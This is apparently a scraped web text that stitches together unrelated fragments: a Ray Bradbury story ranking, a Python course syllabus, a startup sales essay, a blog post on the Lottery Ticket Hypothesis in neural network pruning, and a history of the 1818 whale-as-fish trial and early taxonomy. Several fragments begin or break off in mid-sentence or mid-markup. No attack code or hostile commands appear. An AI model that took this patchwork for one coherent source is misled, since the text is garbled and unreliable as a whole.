started writing his Irish stories, beginning with “The First Night of Lent.”</p><p><span>Historical Aside</span>: A fascinating <em>New York Times </em>article on John Huston’s Georgian Irish Manor, ran June 12, 2012. Check it out <a href="http://www.nytimes.com/2012/06/15/greathomesanddestinations/15iht-reireland15.html">here</a>.</p><p>This is the very house where, in 1953, Nick the cab driver picked Bradbury up late at night, to drive him back to Dublin. This is the very house where Ray say with John Huston, late into the Irish night, as Huston went over Ray’s adaptation of <em>Moby Dick</em>.</p><p><strong>#24 “THE SOUND OF SUMMER RUNNING”</strong></p><p><span>Where to Find It</span>:<em> Dandelion Wine</em>, <em>The Stories of Ray Bradbury</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550446114005_16095"><div>

His shoes are worn out, his feet feel heavy, and he is convinced that this resplendent pair of Cream-Sponge Para Litefoot Shoes will change his summer forever.</p><p><span>Backstory</span>: Ray Bradbury on the origins of the story from <em>Listen to the Echoes: The Ray Bradbury Interviews</em>: </p><p>“I was on a bus going into Westwood a few years ago, and a young boy jumped on the bus, threw his money in the box, raced down the aisle, and threw himself into a seat across from me.&nbsp; And I looked at him, and I said, ‘My god, if I had his energy, I could write a poem every day, a story every week, a novel every month.&nbsp; What’s his secret?’&nbsp; I looked down at his feet.&nbsp; He had the brightest pair of new fresh tennis shoes on his feet.&nbsp; And I said, oh, my god, I can remember when I was a kid, my father taking me downtown and buying me my first pair of new summer tennis shoes.&nbsp; I went home, and I wrote the short story.”</p><p><span>Critique</span>: This story is a shining example of Bradbury’s range as a literary writer. The man did not need an otherworldly landscape or elements of the fantastic to meditate on the human experience. Bradbury found magic in the every day, in this case, in a new pair of tennis shoes and the perspective of youth. The best Bradbury, in my opinion, is rooted in unforgettable story with a philosophical question at its center, all told in his singular, poetic style.</p><p><span>The Prose</span>: <em>Somehow the people who made tennis shoes knew what boys needed and wanted. They put marshmallows and coiled springs in the soles and they wove the rest out of grasses bleached and fired in the wilderness. Somewhere deep in the soft loam of the shoes the thin hard sinews of the buck deer were hidden. The people that made the shoes must have watched a lot of winds blow the trees and a lot of rivers going down to the lakes. Whatever it was, it was in the shoes, and it was summer.</em></p><p><br> <strong>#23 “THE LONG RAIN”</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1553888873530_11881"><div>

We cover the basics of how one constructs a program from a series of simple instructions in Python.</p><p>The course has no pre-requisites and avoids all but the simplest mathematics. Anyone with moderate computer experience should be able to master the materials in this course. This course will cover Chapters 1-5 of the textbook “Python for Everybody”. Once a student completes this module, they will be ready to take the more advanced programming modules. This module covers Python 3.</p><h3>Python Data Structures</h3><p>This module will introduce the core data structures of the Python programming language. We will move past the basics of procedural programming and explore how we can use the Python built-in data structures such as lists, dictionaries, and tuples to perform increasingly complex data analysis. This module will cover Chapters 6-10 of the textbook “Python for Everybody”. This module covers Python 3.</p><h3>Using Python to Access Web Data</h3><p>This module will show how one can treat the Internet as a source of data. We will scrape, parse, and read web data as well as access data using web APIs. We will work with HTML, XML, and JSON data formats in Python. This module will cover Chapters 11-13 of the textbook “Python for Everybody”.</p><p>To succeed in this module, you should be familiar with the material covered in Chapters 1-10 of the textbook and the first two courses in this course. These topics include variables and expressions, conditional execution (loops, branching, and try/except), functions, Python data structures (strings, lists, dictionaries, and tuples), and manipulating files. This module covers Python 3.</p><h3>Using Databases with Python</h3><p>This module will introduce students to the basics of the Structured Query Language (SQL) as well as basic database design for storing data as part of a multi-step data gathering, analysis, and processing effort. The module will use SQLite3 as its database. We will also build web crawlers and multi-step data gathering and visualization processes. We will use the D3.js library to do basic data visualization. This module will cover Chapters 14-15 of the book “Python for Everybody”. To succeed in this module, you should be familiar with the material covered in Chapters 1-13 of the textbook and the first three modules in this course. This module covers Python 3.</p><div role="presentation" data-track="true" data-track-app="xdp_v1" data-track-page="xdp" data-track-action="click" data-track-component="sdp_course_list_link"><h3>Retrieving, Processing, and Visualizing Data with Python</h3><p>In the module, students will build a series of applications to retrieve, process and visualize data using Python. The projects will involve all the elements of the course. In the first part of the module, students will do some visualizations to become familiar with the technologies in use and then will pursue their own project to visualize some other data that they have or can find. Chapters 15 and 16 from the book “Python for Everybody” will serve as the backbone for the capstone. This module covers Python 3.</p><h2>Course Content in Details</h2><ol><li><strong>Installing Python</strong> – The first task is to work through the installation steps including installing</li><li><strong>Why Program?</strong> – We learn why one might want to learn to program, and look at the basic issues with learning to program.</li><li><strong>Variables, expressions, and statements</strong> – We learn how to make variables and store data in those variables.</li><li><strong>Conditional Execution</strong> – We look at how Python executes some statements and skips others.</li><li><strong>Functions</strong> – Take a brief look at how Python implements the ‘store and use later’ programming pattern.</li><li><strong>Loops and Iterations</strong> – We look at how Python repeats statements using looping structures.</li><li><strong>Strings</strong> – We look at how Python stores and manipulates textual data using string variables and functions.</li><li><strong>Files</strong> – We learn how to open data files on your computer and read through the files using Python.</li><li><strong>Lists</strong> – We look at Python’s simplest data structure – the list. Lists can store more than one item in a variable.</li><li><strong>Dictionaries</strong> – The dictionary data structures allows us to store multiple values in an object and look up the values by their key.</li><li><strong>Tuples</strong> – The tuple is a Python data structure that is like a simple and efficient list.</li><li><strong>Regular Expressions</strong> – Regular Expressions allow us to search for patterns in strings and extract data from strings using the regular expression programming language.</li><li><strong>Network Programming</strong> – We take a quick look at how data moves across the network using the HyperText Transport Protocol (HTTP) and how we write programs to read data scross the network.</li><li><strong>Using Web Services</strong> – Web services allow a program to access data available in a different server.</li><li><strong>Object-Oriented Programming</strong> – We do a quick look at how Python supports the Object-Oriented programming pattern.</li><li><strong>Databases</strong> – Databases give us very fast random access to large amounts of data. There is a lot of material in this chapter as we learn the Structured Query Language (SQL).</li><li><strong>Data Visualization</strong> – In this section, we learn to scrape data from the network, store the data in a database and then read the data from the database to produce in in-browser visualization of the data.</li></ol></div></div></div>]]>

Their eyes light up and they immediately get it.</p><p>The company is almost always a category leader, or quickly on its way. Often, their app is on my phone home screen. The press constantly writes about them. Customers rave about their product. Awards are the norm. Everyone knows who they are. I’m giddy just speaking with them. </p><p>But there’s no selling necessary. Budget is rarely an issue. I meet with them for 30 minutes and they move right into a trial. </p><p>The struggling companies? Their startup isn’t taking off. Growth has plateaued. The stock price is declining. Competitors are stealing customers.</p><p>When I meet with these companies it’s always a challenging conversation. They say there are other priorities. I realize it’ll be a long sales cycle. They rarely move forward. </p><p>Those winners? They’re winning because they understand their customer — and better than anyone else. Customer motivations. Inner fears. Challenges. Habits.</p><p>Their top priority is their customer. It was from day one. It's why they became successful. It’s why they’re winning today. It’s how they know they’ll continue to win—every day. UserLeap is the ideal solution that puts their customer first and drives customer-informed decision making across their company.</p><p>The struggling companies? Their customers are a priority tomorrow. Or next quarter. Or next year. Right now, something else is more important. Internal politics. A logo redesign. A press write up. An internal promotion. The next Forbes list. Our product offers little value to them. They say the budget is full. </p><p>I may never figure out how to sell to struggling companies. And that maybe that’s ok.</p>

        <p>Metaphors are powerful tools to transfer ideas from one mind to another. Alan Kay introduced the alternative meaning of the term ‘desktop’ at Xerox PARC in 1970. Nowadays everyone - for a glimpse of a second - has to wonder what is actually meant when referring to a desktop. Recently, Deep Learning had the pleasure to welcome a new powerful metaphor: The Lottery Ticket Hypothesis (LTH).
<!--more-->
But what idea does the Hypothesis try to transmit? In todays post we dive deeper into the hypothesis and review the literature after the original ICLR best paper award by <a href="#frankle_2019">Frankle &amp; Carbin (2019)</a>.</p>

<p>Pruning over-parametrized neural networks has a long tradition in Deep Learning. Most commonly it refers to setting a particular weight to 0 and freezing it for the course of any subsequent training. This can easily be done by element-wise multiplying the weights $W$ with a binary pruning mask $m$. There are several <strong>motivating factors</strong> for performing such a surgical intervention:</p>

<ul>
  <li>It supports generalization by regularizing overparametrized functions.</li>
  <li>It reduces the memory constraints during inference time by identifying well-performing smaller networks which can fit in memory.</li>
  <li>It reduces energy costs, computations, storage and latency which can all support deployment on mobile devices.</li>
</ul>

<p>With the recent advent of deeper and deeper networks all 3 factors have been seeing a resurgence in attention. Broadly speaking any competitive pruning algorithm has to address 4 fundamental questions:</p>

<ol>
  <li>
<strong>What connectivity structures to prune?</strong>: <em>Unstructured pruning</em> does not consider any relationships between the pruned weights. <em>Structured pruning</em>, on the other hand, prunes weights in groups, e.g. by removing entire neurons (weight columns), filters or channels of CNNs. Although unstructured pruning often allows to cut down the number of weights more drastically (while maintaining high performance), this does not have to speed up computations on standard hardware. The key here is that dense computations can easily be parallelized while ‘scattered’ computations can’t. Another distinction has to be made between global and local pruning. <em>Local pruning</em> enforces that one prunes $s$ percent of weights from each layer. <em>Global pruning</em>, on the other hand, is unrestricted and simply requires that the total number of weights across the entire network is pruned by $s$ percent.

 </center>
    <center><p>
     <em>Fig. 1: What, How, When and How often to prune?</em>
 </p></center>
  </li>
  <li>
    <p><strong>How to rank weights to prune?</strong>: There are many more or less heuristic ways to score the importance of a particular weight in a network. A common rule of thumb is that large magnitude weights have more impact on the function fit and should be pruned less. While working well in practice, this intuitively may seem to contradict ideas such as $L_2$-weight regularization which actually punishes large magnitude weights. This motivates more involved techniques which learn pruning masks using gradient-based methods or even higher-order curvature information.</p>
  </li>
  <li>
    <p><strong>How often to prune?</strong>: Weight magnitude is often only a noisy proxy for weight importance. Pruning only a single time at the end of training (<em>one-shot</em>) can become victim to this noise. Iterative procedures, on the other hand, prune only a small number of weights after one training run but reiterate the <em>train - score - prune - rewind</em> cycle. This often times helps to de-noise the overall pruning process. Commonly the pruning rate per iteration is around 20% and a total of 20 to 30 pruning iterations are used (which leaves us with only 1% percent of non-pruned weights). One can be more conservative - at the cost of training for a lot longer!</p>
  </li>
  <li>
<strong>When to perform the pruning step?</strong>: One can perform pruning at 3 different stages of network training - after, during and before training. When pruning after the training has converged the performance often decreases, which makes it necessary to retrain/fine-tune and to give the network a chance to readjust. Pruning during training, on the other hand, is often associated with regularization and ideas of dropout/reinforcing distributed representations. Until very recently it was impossible to trained sparse networks from scratch.</li>

<h2 id="frankle--carbin-2019---the-lottery-ticket-hypothesis-finding-sparse-trainable-neural-networks">Frankle &amp; Carbin (2019) - The Lottery Ticket Hypothesis: Finding Sparse, Trainable Neural Networks</h2>
<h3 id="paper--code">
<a href="https://openreview.net/forum?id=rJl-b3RcF7">Paper</a> | <a href="https://github.com/facebookresearch/open_lth">Code</a>
</h3>

<p>While the traditional literature has been able to show that a fully trained dense network can be pruned to little parameters without degrading performance too much, for a long time it has been impossible to successfully train a sparse sub-network from scratch. So why might this the case? The smaller subnetwork <strong>can</strong> approximate a well performing function. But the learning dynamics appear to be very different compared to the dense network.</p>

<p>The original lottery ticket hypothesis paper <a href="#frankle_2019">(Frankle &amp; Carbin, 2019)</a> first provided insight why this might be the case: After pruning the resulting sub-networks were <strong>randomly initialized</strong>. If one instead re-initializes the weights back to their original (but now masked) weights $m \odot W_0$, it is possible to recover performance on par (or even better!) in potentially fewer training iterations. These high-performing sub-networks can then be thought of as winners of the weight initialization lottery. The hypothesis goes as follows:</p>

<blockquote>
  <p><strong>The Lottery Ticket Hypothesis</strong>: A randomly-initialized, dense neural network contains a subnetwork that is initialised such that — when trained in isolation — it can match the test accuracy of the original network after training for at most the same number of iterations. - Frankle &amp; Carbin (2019, p.2)</p>
</blockquote>

<p>So how can we attempt to find such a winning ticket? <a href="#frankle_2019">Frankle &amp; Carbin (2019)</a> propose <strong>iterative magnitude pruning</strong> (IMP): Starting from a dense initialization $W_0$ we train our network until convergence to obtain $W_{T^\star}^{(1)}$. Afterwards, we determine the $s$ percent smallest magnitude weights and create a binary mask $m^{(1)}$ that prunes these. We then retrain the sparsified network with its <strong>previous initial weights</strong> $m^{(1)} \odot W_0$. After convergence we repeat the pruning process (masking additional $s^2$ weights) and reset to the initial weights with the newly found mask $m^{(2)}$. We iterate this process until we reach the desired level of sparsity or the test accuracy drops significantly.</p>

</p></center>

<p>If IMP succeeds it finds the <em>winner of the initialization lottery</em>. This is simply the subnetwork $m^{(n)} \odot W_0$ that remains after this iterative pruning process. Note that it is also possible to simply prune in a one-shot fashion - but better results are obtained when spending that extra compute (see figure 4 of <a href="#frankle_2019">Frankle &amp; Carbin (2019)</a>). If we think back to the broad questions of the pruning literature IMP fits in as follows:</p>

<p><a href="https://roberttlange.github.io/images/blog_posts_2020/05_Lottery_Tickets/imp_classification.png" data-lightbox="1"><img src="https://roberttlange.github.io/images/blog_posts_2020/05_Lottery_Tickets/imp_classification.png"></a></p>
<center><p>
    <em>Fig. 3: IMP and the pillars of pruning</em>
</p></center>

<p>Some key empirical insights of the very first LTH paper are summarized in the figure below:</p>

<ul>
  <li>
<strong>Panel A</strong>: Randomly reinitializing &amp; re-training pruned networks leads to deteriorated performance. Results shown are on MNIST with the LeNet architecture.</li>
</ul>

<p><a href="https://roberttlange.github.io/images/blog_posts_2020/05_Lottery_Tickets/lth_1.png" data-lightbox="1"><img src="https://roberttlange.github.io/images/blog_posts_2020/05_Lottery_Tickets/lth_1.png"></a></p>
<center><p>
    <em>Fig. 4: LTH key results. Source: Adapted from <a href="https://openreview.net/forum?id=rJl-b3RcF7">Frankle &amp; Carbin (2019)</a></em>
</p></center>

<ul>
  <li>
    <p><strong>Panel B</strong>: Without any hyperparameter adjustments IMP is able to find sparse subnetworks that are able to outperform un-pruned dense networks in fewer training iterations (the legend refers to the percentage of pruned weights). The gap in final performance between a lottery winning initialization and a random re-initialization is referred to as the <em>lottery ticket effect</em>.</p>
  </li>
  <li>
    <p><strong>Panel C</strong> &amp; <strong>Panel D</strong>: In order to scale the original results to more complicated tasks/architectures like CIFAR-10, VGG-19 and Resnet-20, <a href="#frankle_2019">Frankle &amp; Carbin (2019)</a> had to adapt the learning rate as well as include a warmup (annealing from 0 to the final rate within a predefined set of iterations) schedule. Note that the required Resnet learning rate is a lot smaller than the VGG-19 learning rate.</p>
  </li>
</ul>

<p>So what can this tell us? First, IMP can find a substructure that is favourable for the task at hand and that the weight initialization of that subnetwork is <em>special</em> in terms of learning dynamics. Furthermore, over-parametrization is not necessary for successful training - it may only help by providing a combinatorial explosion of available subnetworks. A lot of the interesting follow-up work characterizes potential mechanisms behind the qualitative differences of winning tickets.</p>

<h2 id="frankle-dziugaite-roy--carbin-2019---stabilizing-the-lottery-ticket-hypothesis">Frankle, Dziugaite, Roy, &amp; Carbin (2019) - Stabilizing the Lottery Ticket Hypothesis</h2>
<h3 id="paper--code-1">
<a href="https://arxiv.org/abs/1903.01611">Paper</a> | <a href="https://github.com/facebookresearch/open_lth">Code</a>
</h3>

<p>One limitation of the original lottery ticket paper was that its restriction to small-scale tasks such as MNIST and CIFAR-10. In order to scale the LTH to competitive CIFAR-10 architectures, <a href="#frankle_2019">Frankle &amp; Carbin (2019)</a> had to tune learning rate schedules. Without this adjustment it is not possible to obtain a pruned network that is on par with the original dense network <a href="#liu_2018">(Liu, Sun, Zhou, Huang, &amp; Darrell, 2018; Gale, Elsen, &amp; Hooker, 2019)</a>. But what if we loosen up some of the ticket restrictions?</p>

<p>In follow-up work <a href="#frankle_2019b">Frankle, Dziugaite, Roy, &amp; Carbin (2019)</a> asked whether it might be possible to robustly obtain pruned subnetworks by not resetting the weights to their initial values $W_0$ but to weights found after a small number of $k$ training iterations. In other words, <strong>instead of rewinding to iteration 0 after pruning, we rewind to iteration $k$</strong>. Here is the formal definition and a graphical illustration:</p>

<blockquote>
  <p><strong>The Lottery Ticket Hypothesis with Rewinding</strong>: Consider a dense, randomly-initialized neural network $f(x;W_0)$ that trains to accuracy $a^\star$ in $T^\star$ iterations. Let $W_t$ be the weights at iteration $t$ of training. There exist an …</p></blockquote></section></div></div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1538294279411_7051"><div><p>On December 31, 1818, lawyer <a href="https://web.archive.org/web/20070927214039/http://www.lisburn.com/books/historical_society/volume4/volume4_2.html"><span>William Sampson</span></a> walked into the New York courtroom with the confidence of one ready to fight the elite. He had already experienced imprisonment and violence in his native land of Ireland, before he was exiled to the continent and eventually moved to the United States. His partner Mr Anthon gave the <a href="http://mysite.du.edu/~ttyler/ploughboy/Is%20the%20Whale%20a%20Fish.htm"><span>opening statements</span></a>: “It is fortunate…that this statute is not to be interpreted according to the refined and learned opinions of naturalists…but [is] to receive an interpretation according to their common and popular usage.” </p><p>While scientists quibbled over terms, functions, and definitions, laypeople had the common sense to know: a whale was a fish.</p><p>Sampson and Anthon represented the fish oil inspector James Maurice against a whale oil businessman named Samuel Judd. A recent shipment had arrived of new sperm whale oil. Candlemaker and oil merchant Samuel Judd had purchased three barrels of oil, but inspector Maurice claimed Judd owed fines on the oil in accordance with fish oil law. Since Judd had avoided the inspection, he owed the city a $75 fine. But Judd claimed that whales were not fish, and he did not need to pay the fee. When he still refused to pay, Maurice brought Judd to court.</p><p>As the largest creature of the water, common sense would probably lead most 18th century laypeople to conclude that whales were fish. Whales, dolphins, and fish all share a similar torpedo-like shape, smooth skin, and thick fins. They swim deep under the water and only surface for moments, shooting streams of water into the air. They dive, jump, and leap through the water. They are the kings of the oceans.</p><p>The entire court case hinged on a single question: is a whale a fish? Each side would parade a litany of names in front of the jury. But for the star expert witness, a medical doctor and natural historian named <a href="http://bioguide.congress.gov/scripts/biodisplay.pl?index=M000831"><span>Dr Samuel Mitchell</span></a>, the answer was simple: “As a man of science, I can say positively that a whale is no more a fish, than a man; nobody pretends to the contrary now-a-days, but lawyers and politicians.” </p></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1538707180091_7305"><div>

When Pliny divided animals into three major categories, terrestrial, aquatic, and insect, he classified animals according to their environment; and the deep oceans held mysterious creatures. He <a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0137%3Abook%3D9%3Achapter%3D1"><span>wrote</span></a>, “In the seas, spread out as they are far and wide, forming an element at once so delicate and so vivifying, and receiving the generating principles&nbsp;from the regions of the air, as they are ever produced by Nature, many animals are to be found, and indeed, most of those that are of monstrous form.”</p><p>These monsters included the “balenae”, dolphins, and orcas — which breathed with lungs, whereas other fish used gills. Roman polymath Pliny the Elder <a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0137%3Abook%3D9%3Achapter%3D6"><span>described</span></a> whales as such: “Balænæ have the mouths&nbsp;in the forehead; and hence it is that, as they swim on the surface of the water, they discharge vast showers of water in the air. It is universally agreed, however, that they respire, as do a very few other animals<span> </span>in the sea, which have lungs among the internal viscera; for without lungs it is generally supposed that no animal can breathe.”</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1538707180091_13933"><div><p>Despite their habit of respiring air, whales and other large creatures of the sea remained a mysterious fish for ancient writers.</p><p>It was not until the 18th century that scientists began to systematically investigate how to classify the animal kingdom. The shape of the animal came to matter less, and scientists judged categories based on organ interaction and structure. The great taxonomist <a href="http://linnaeus.c18.net/Doc/lbio.php"><span>Carolus Linnaeus</span></a> embarked on this transformation with his publication <a href="https://www.biodiversitylibrary.org/item/10277#page/3/mode/1up"><span><em>System of Nature</em></span></a>. “I have submitted with patience to the scoffs of the ignorant and the malicious, who have either contemned the objects, or envied the success, of my laborious pursuits.” </p><p>He first published the method in 1735 and explained that his method required naming. To name something was to investigate its nature. Just as streams lead to rivers and lakes and larger bodies of water, so too did names organise the various parts of the world. He said, “The framer of a systematic arrangement begins his study by the investigation of small details.” To accomplish this process, Linnaeus examined the animal as a machine. The parts of the animal could then be divided into systems, like an engine, where each group was composed of its functioning parts, or in biological nomenclature, the organs. </p><p>And what were these particulars? As Linnaeus visited museums and collections around Sweden, he studied individual specimens and divided animals into six classes: Mammals, Birds, Amphibians, Fishes, Insects, and Worms. Mammals and birds were grouped together since they both had a four-chambered heart and warm blood. Amphibians and fishes were next grouped together since they were cold-blooded and had a heart composed of a single auricle and ventricle. Finally, insects and worms formed the final set, because they had a single auricle and ventricle and were cold-blooded. </p><p>Additional criteria based on functions defined the classes. For instance, mammals gave birth to live young, meaning mammals were viviparous, and the birds gave birth by eggs, making them oviparous. Linnaeus also pointed out that mammals milked their young, walked on four legs, and were mostly covered in fur. </p><p>Whales, however, were not so easily categorised. When Linnaeus introduced this group, he wrote, “All the animals of this order more readily bring to mind the Quadrupeds than the Fish, when we consider their internal structure: lungs, respiration, breasts, feet, appendages, live birth, etc. all indicate as much. We attach them, nevertheless to the Fishes by reason of their habitus, their medium, their swimming, etc. in order not to fall from Charybdis into Scylla.” </p><p>Thus, despite all the anatomical evidence showing that whales ought to be organised with mammals, Linnaeus felt common-sense forced him to class them with fish. </p></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1538707180091_17103"><div>

Brisson was also interested in organising the animal kingdom in a systematic method that drew on empirical investigation of animal systems and organs. Working in the backrooms of the <a href="https://books.google.co.il/books/about/The_Origins_of_Museums.html?id=0LkhAQAAIAAJ&amp;source=kp_book_description&amp;redir_esc=y"><span>18th century French “Cabinets”</span></a>, the forerunners of museum collections, Brisson <a href="https://www.biodiversitylibrary.org/item/141376#page/9/mode/1up"><span>examined</span></a> natural history specimens “which have daily set before my eyes the richest collections of nature’s production.”</p><p>Analogy helped Brisson categorise the animals. He thus defined creatures in terms of their relationship to the human body and divided them according to their blood, lungs, ventricles, reproduction, hair or fur, and number of appendages. By subtracting the number of similar analogies to human anatomy, Brisson identified nine classes: quadrupeds, cetaceans, birds, cartilaginous fish, fish, reptiles, crustaceans, insects, and worms.</p><p>Anatomy helped Brisson differentiate between similar animals. For instance, instead of including all marine creatures under the fish class, Brisson distinguished sharks and other cartilaginous fish compared to other fish. He followed the same strategy with whales. “Like the Quadrupeds, Cetaceans have two ventricles in the heart; breath with lungs; couple, give birth to live young, and milk their young,” he wrote. “They also resemble the Quadrupeds by their structure and use of their internal organs.” </p><p>Why then were they not classed with the other mammals? Again, the reason was their environment. “All the animals of this class always live in the water, and they never leave, without risking their lives,” Brisson wrote.</p><p>Museum “cabinets”, however, could only offer so much to natural scientists. Brisson was only able to examine a few cetaceans in the natural history collections. It would not be until 1787 when the whaling industry began to take off that natural history had more direct information on whales. </p><p>Before kerosene and the discovery of petroleum, whale oil lit the world and was the engine of industrialisation. Although a dangerous enterprise, hunting blubbery whales could yield huge profits. </p><p>Natural scientists like John Hunter commissioned other “scientific minds,” to help them collect specimens for dissection and further investigation, for “the animals which inhabit the sea are much less known to us than those found upon the land.” Hunter <a href="http://rstl.royalsocietypublishing.org/content/77/371"><span>commissioned</span></a> one surgeon on a whale ship to Greenland to bring back a specimen. The surgeon had difficulty, and “the only return I received for this expense was a piece of whale’s skin, with some small animals sticking upon it.” His …</p></div></div></div></div></div></div></article></div></div>
